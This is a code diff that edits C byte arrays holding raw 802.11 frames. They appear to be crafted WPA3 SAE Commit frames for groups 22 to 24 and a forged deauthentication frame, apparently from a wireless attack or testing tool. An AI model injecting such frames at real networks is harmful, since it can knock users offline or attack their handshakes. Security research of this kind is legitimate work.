@@ -8,15 +8,6 @@
 
 #define USED_RATE 54000000
 
-unsigned char AUTH_REQ_SAE_COMMIT_ECC_HEADER[] =
-		/* 802.11 header */
-		"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"
-		"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"
-		/* SAE Commit frame */
-		"\x03\x00\x01\x00\x00\x00";
-size_t AUTH_REQ_SAE_COMMIT_ECC_HEADER_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_ECC_HEADER) - 1;
-
-
 unsigned char AUTH_REQ_SAE_COMMIT_GROUP_22[] = /* 802.11 header */
 		"\xb0\x00\x00\x00\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"
 		"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00"
@@ -42,7 +33,7 @@ unsigned char AUTH_REQ_SAE_COMMIT_GROUP_22[] = /* 802.11 header */
 		"\x8c\x9a\x0f\x12\x22\xa3\x2d\x70\x16\xdd\x30\x9c\xc2\x2b\xda\x8a"
 		"\x0f\xe0\x5b\x4f\xa4\x9b\x5d\x4f\x35\x70\xc8\xe9\x56\x21\xae\x61"
 		"\x04\xfe\x83\x1f\xe5\xac\x64\xd7";
-size_t AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_22) - 1;
+int AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_22) - 1;
 
 unsigned char AUTH_REQ_SAE_COMMIT_GROUP_23[] =
 		/* 802.11 header */
@@ -86,7 +77,7 @@ unsigned char AUTH_REQ_SAE_COMMIT_GROUP_23[] =
 		"\x90\xfa\xc4\x2e\xeb\xd0\xeb\xc7\xd6\x3f\xb5\x73\xa7\xfe\x80\x54"
 		"\x29\x4a\xc8\xcc\xbb\x38\x2d\x1d\x32\xef\x80\x10\xa5\xc2\x3f\x29"
 		"\xd2\x26\x60\x41\x4b\xc4\xb8\x1c";
-size_t AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_23) - 1;
+int AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_23) - 1;
 
 unsigned char AUTH_REQ_SAE_COMMIT_GROUP_24[] =
 		/* 802.11 header */
@@ -130,12 +121,12 @@ unsigned char AUTH_REQ_SAE_COMMIT_GROUP_24[] =
 		"\x8f\x86\x87\xd4\xcb\xd6\x52\xb0\x29\x34\x76\x7c\x46\x2b\xe7\xb6"
 		"\xd0\x86\x01\xbd\x27\x64\x08\xbe\x6a\xaa\x31\x90\xc6\x99\x61\x06"
 		"\xdf\x1f\x0a\x54\x78\xd5\xba\x91";
-size_t AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_24) - 1;
+int AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE = sizeof(AUTH_REQ_SAE_COMMIT_GROUP_24) - 1;
 
 unsigned char DEAUTH_FRAME[] =
-		"\xc0\x00\x3a\x01\x2c\xb0\x5d\x5b\xd2\x65\x00\x8e\xf2\x7d\x8b\x10"
-		"\x2c\xb0\x5d\x5b\xd2\x65\x60\x5f\x03\x00";
-size_t DEAUTH_FRAME_SIZE = sizeof(DEAUTH_FRAME) - 1;
+		"\xc0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+		"\x00\x00\x00\x00\x00\x00\x60\x5f\x03\x00";
+int DEAUTH_FRAME_SIZE = sizeof(DEAUTH_FRAME) - 1;
 
 struct state_ecc {
 	const EC_GROUP *group;
